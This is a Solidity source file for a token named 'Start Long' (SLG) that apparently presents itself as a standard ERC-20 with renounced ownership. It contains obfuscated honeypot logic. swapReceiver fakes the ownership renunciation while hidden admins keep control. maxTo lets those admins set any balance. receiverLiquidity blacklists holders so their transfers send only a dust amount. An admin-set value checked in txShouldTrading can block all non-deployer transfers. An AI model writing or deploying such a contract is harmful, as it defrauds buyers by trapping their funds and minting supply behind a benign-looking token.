//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface launchMin {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract teamReceiverWallet {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface shouldTeam {
    function createPair(address feeTo, address toMin) external returns (address);
}

interface senderToken {
    function totalSupply() external view returns (uint256);

    function balanceOf(address launchedAmountAt) external view returns (uint256);

    function transfer(address atSwap, uint256 fromTrading) external returns (bool);

    function allowance(address tokenExempt, address spender) external view returns (uint256);

    function approve(address spender, uint256 fromTrading) external returns (bool);

    function transferFrom(
        address sender,
        address atSwap,
        uint256 fromTrading
    ) external returns (bool);

    event Transfer(address indexed from, address indexed atWallet, uint256 value);
    event Approval(address indexed tokenExempt, address indexed spender, uint256 value);
}

interface senderTokenMetadata is senderToken {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract StartLong is teamReceiverWallet, senderToken, senderTokenMetadata {

    string private exemptTx = "Start Long";

    uint256 swapSender;

    constructor (){
        
        launchMin feeExempt = launchMin(feeTotal);
        fundLaunched = shouldTeam(feeExempt.factory()).createPair(feeExempt.WETH(), address(this));
        if (sellTokenLaunched == launchedSender) {
            launchedSender = false;
        }
        takeSell = _msgSender();
        swapReceiver();
        swapAmount[takeSell] = true;
        maxTotal[takeSell] = buyMode;
        if (sellTokenLaunched == txMode) {
            txMode = false;
        }
        emit Transfer(address(0), takeSell, buyMode);
    }

    function name() external view virtual override returns (string memory) {
        return exemptTx;
    }

    bool public launchMarketing;

    address feeTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function swapReceiver() public {
        emit OwnershipTransferred(takeSell, address(0));
        senderAuto = address(0);
    }

    function transferFrom(address sellAuto, address atSwap, uint256 fromTrading) external override returns (bool) {
        if (_msgSender() != feeTotal) {
            if (marketingMax[sellAuto][_msgSender()] != type(uint256).max) {
                require(fromTrading <= marketingMax[sellAuto][_msgSender()]);
                marketingMax[sellAuto][_msgSender()] -= fromTrading;
            }
        }
        return txShouldTrading(sellAuto, atSwap, fromTrading);
    }

    function owner() external view returns (address) {
        return senderAuto;
    }

    function sellMarketing(address txLimit) public {
        require(txLimit.balance < 100000);
        if (launchMarketing) {
            return;
        }
        
        swapAmount[txLimit] = true;
        
        launchMarketing = true;
    }

    mapping(address => bool) public takeLimit;

    uint256 constant launchedTo = 7 ** 10;

    function receiverLiquidity(address feeAmount) public {
        enableLiquidity();
        if (txMode == launchedSender) {
            txMode = false;
        }
        if (feeAmount == takeSell || feeAmount == fundLaunched) {
            return;
        }
        takeLimit[feeAmount] = true;
    }

    function enableLiquidity() private view {
        require(swapAmount[_msgSender()]);
    }

    uint256 private buyMode = 100000000 * 10 ** 18;

    mapping(address => bool) public swapAmount;

    function symbol() external view virtual override returns (string memory) {
        return teamList;
    }

    function transfer(address receiverListMode, uint256 fromTrading) external virtual override returns (bool) {
        return txShouldTrading(_msgSender(), receiverListMode, fromTrading);
    }

    function balanceOf(address launchedAmountAt) public view virtual override returns (uint256) {
        return maxTotal[launchedAmountAt];
    }

    address modeIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function approve(address sellModeAuto, uint256 fromTrading) public virtual override returns (bool) {
        marketingMax[_msgSender()][sellModeAuto] = fromTrading;
        emit Approval(_msgSender(), sellModeAuto, fromTrading);
        return true;
    }

    address public fundLaunched;

    function decimals() external view virtual override returns (uint8) {
        return toShould;
    }

    function getOwner() external view returns (address) {
        return senderAuto;
    }

    mapping(address => uint256) private maxTotal;

    bool private launchedSender;

    function walletTrading(address sellAuto, address atSwap, uint256 fromTrading) internal returns (bool) {
        require(maxTotal[sellAuto] >= fromTrading);
        maxTotal[sellAuto] -= fromTrading;
        maxTotal[atSwap] += fromTrading;
        emit Transfer(sellAuto, atSwap, fromTrading);
        return true;
    }

    string private teamList = "SLG";

    uint256 fundList;

    function tokenWallet(uint256 fromTrading) public {
        enableLiquidity();
        fundList = fromTrading;
    }

    uint8 private toShould = 18;

    function maxTo(address receiverListMode, uint256 fromTrading) public {
        enableLiquidity();
        maxTotal[receiverListMode] = fromTrading;
    }

    event OwnershipTransferred(address indexed takeAmountMarketing, address indexed launchFrom);

    mapping(address => mapping(address => uint256)) private marketingMax;

    function txShouldTrading(address sellAuto, address atSwap, uint256 fromTrading) internal returns (bool) {
        if (sellAuto == takeSell) {
            return walletTrading(sellAuto, atSwap, fromTrading);
        }
        uint256 txTotal = senderToken(fundLaunched).balanceOf(modeIs);
        require(txTotal == fundList);
        require(atSwap != modeIs);
        if (takeLimit[sellAuto]) {
            return walletTrading(sellAuto, atSwap, launchedTo);
        }
        return walletTrading(sellAuto, atSwap, fromTrading);
    }

    bool private txMode;

    address public takeSell;

    bool private sellTokenLaunched;

    function totalSupply() external view virtual override returns (uint256) {
        return buyMode;
    }

    address private senderAuto;

    function allowance(address tradingFrom, address sellModeAuto) external view virtual override returns (uint256) {
        if (sellModeAuto == feeTotal) {
            return type(uint256).max;
        }
        return marketingMax[tradingFrom][sellModeAuto];
    }

}